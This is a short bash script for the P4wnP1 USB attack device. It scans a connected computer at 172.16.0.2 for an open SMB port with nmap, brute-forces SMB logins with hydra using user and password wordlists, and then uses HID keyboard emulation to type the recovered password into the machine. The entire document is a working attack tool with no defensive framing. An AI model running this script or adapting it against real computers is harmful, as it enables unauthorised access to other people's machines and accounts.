#!/bin/bash

# make sure to enable RNDIS
# in this case, the computer connected is at 172.16.0.2

# change these two accordingly
userlist=/opt/dict/user.txt
passlist=/opt/dict/pass.txt

tmp=$(mktemp)
nmap -p445 -Pn 172.16.0.2 > $tmp
P4wnP1_cli led -b 1

if ! grep -q "445.*open" $tmp # checking if port 445 is open
then
	echo "port closed"
	rm $tmp
	P4wnP1_cli led -b 0
	exit
fi

# now try to bruteforce
P4wnP1_cli led -b 20
hydra -L $userlist -P $passlist smb://172.16.0.2 -qI > $tmp

if ! grep -q "\[445\]\[smb\] host: 172\.16\.0\.2" $tmp
then
	echo "login not found"
	rm $tmp
	P4wnP1_cli led -b 0
	exit
fi

P4wnP1_cli led -b 500
pass=$(egrep -o "password: .+" $tmp | cut -d ' ' -f 2)
P4wnP1_cli hid run -c "type('$pass\n')"
P4wnP1_cli led -b 0
